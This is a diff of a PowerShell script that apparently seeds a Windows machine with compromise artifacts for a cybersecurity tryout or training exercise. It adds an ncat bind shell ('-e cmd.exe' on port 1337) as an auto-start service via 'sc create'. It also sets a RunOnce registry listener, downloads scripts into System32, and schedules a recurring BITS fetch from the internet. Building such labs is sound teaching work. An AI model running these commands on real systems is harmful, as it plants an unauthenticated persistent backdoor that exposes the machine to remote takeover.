@@ -13,8 +13,10 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/bluefireexplosion/cybe
 #Force ncat to run on startup and listen on port 1337
 New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "NcatStartup" -Value "C:\Windows\System32\ncat.exe -l -p 1337" -PropertyType "String"
 #Start it as an immediate service as well so that the trainee doesn't have to wait for a boot to see the shell
-New-Service -Name "Cats" -BinaryPathName "cmd.exe /c start C:\Windows\System32\ncat.exe -n -l -p 1337 -e cmd.exe" -DisplayName "Cats" -StartupType Automatic; Start-Service -Name "Cats"
+#New-Service -Name "Cats" -BinaryPathName "cmd.exe /c start C:\Windows\System32\ncat.exe -n -l -p 1337 -e cmd.exe" -DisplayName "Cats" -StartupType Automatic; Start-Service -Name "Cats"
 #Start-Process -FilePath "C:\Windows\System32\ncat.exe" -ArgumentList "-l -p 1337"
+sc create Cats1 binPath= "cmd.exe /c start C:\Windows\System32\ncat.exe -n -l -p 1337 -e cmd.exe" start= auto error= ignore
+sc start Cats1
 #Download the bits service helper script
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/bluefireexplosion/cyberdawgs-tryouts/master/bits-service.ps1" -OutFile "C:\Windows\System32\bits-service.ps1"
 #Create a scheduled task running the BITS transfer every 30 seconds, redownloading from the internet
